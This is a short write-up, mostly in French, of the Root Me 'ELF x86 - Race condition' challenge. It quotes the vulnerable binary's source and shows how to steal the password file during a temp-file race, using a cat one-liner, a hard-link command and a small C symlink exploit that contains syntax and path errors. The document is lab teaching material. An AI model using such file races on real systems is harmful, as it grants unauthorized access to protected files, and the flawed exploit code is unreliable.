---
title: "ELF x86 - Race condition"
date: 2026-04-08
lastmod: 2026-04-08
tags:
  - cyber
  - writeup
draft: false
---

## Summary

[One sentence summary]
## Concepts
- **Race Condition:** a flaw where a system's behavior depends on the sequence or timing of uncontrollable events.
- **Symbolic Link (symlink):** a special type of file that serves as a reference to another file or directory.
- **unlink:** a system call or command used to remove a file or symbolic link from the filesystem.

#CYBER 

[Challenges/App - System : ELF x86 - Race condition [Root Me : Hacking and Information Security learning platform] (root-me.org)](https://www.root-me.org/en/Challenges/App-System/ELF-x86-Race-condition)

Le but c’est de découvrir les race conditions. Une race condition c’est quand 2 programmes veulent accéder en même temps à la même ressource. 

```c
#include <stdio.h>
#include <string.h>
#include <sys/ptrace.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdlib.h>
 
#define PASSWORD "/challenge/app-systeme/ch12/.passwd"
#define TMP_FILE "/tmp/tmp_file.txt"
 
int main(void)
{
  int fd_tmp, fd_rd;
  char ch;
 
 
  if (ptrace(PTRACE_TRACEME, 0, 1, 0) < 0)
    {
      printf("[-] Don't use a debugguer !
");
      abort();
    }
  if((fd_tmp = open(TMP_FILE, O_WRONLY | O_CREAT, 0444)) == -1)
    {
      perror("[-] Can't create tmp file ");
      goto end;
    }
   
  if((fd_rd = open(PASSWORD, O_RDONLY)) == -1)
    {
      perror("[-] Can't open file ");
      goto end;
    }
   
  while(read(fd_rd, &ch, 1) == 1)
    {
      write(fd_tmp, &ch, 1);
    }
  close(fd_rd);
  close(fd_tmp);
  usleep(250000);
end:
  unlink(TMP_FILE);
   
  return 0;
}
```

Ici le script lit le fichier `.pass`  et l’écrit dans le fichier `/tmp/tmp_file.txt` . Sauf que le script supprime le lien symbolique en 250000µs. On doit donc arriver à accéder à la ressource pendant ce laps de temps.

La solution la plus facile est de `cat`  le fichier en même temps:

`./ch12 | cat /tmp/tmp_file.txt` 

Le résultat n’est pas garentie car il faut que cat se trouve dans la même “window” de modification que le script. En quelques essais on obtient le password en clair dans le terminal.

Une autre solution potentiellement plus viable pour la suite est de créer un lien symbolique entre tmp_file.txt et un autre fichier que l’on peut acceder. Ainsi on obtiendra un fichier avec le mdp. Si on fait cela avec un script C par exemple, cela permet d’exécuter un grand nombre de fois notre attaque pour augmenter les chances de succès dans les cas ou la fenêtre est courte.

Exemple en bash:

`./binary12 & ln -v /tmp/tmp_file.txt /tmp/powned` 

Exemple en C:

```c
#include <unistd.h>

int void(main) {
    unlink("tmp/tmp_file.txt"); // Pas sur que ca soit nécéssaire
    symlink("path/to/new/file.txt", "tmp/tmp_file.txt");
}
```

```bash
gcc exploit.c -o exploit
./ch12 & ./exploit
```
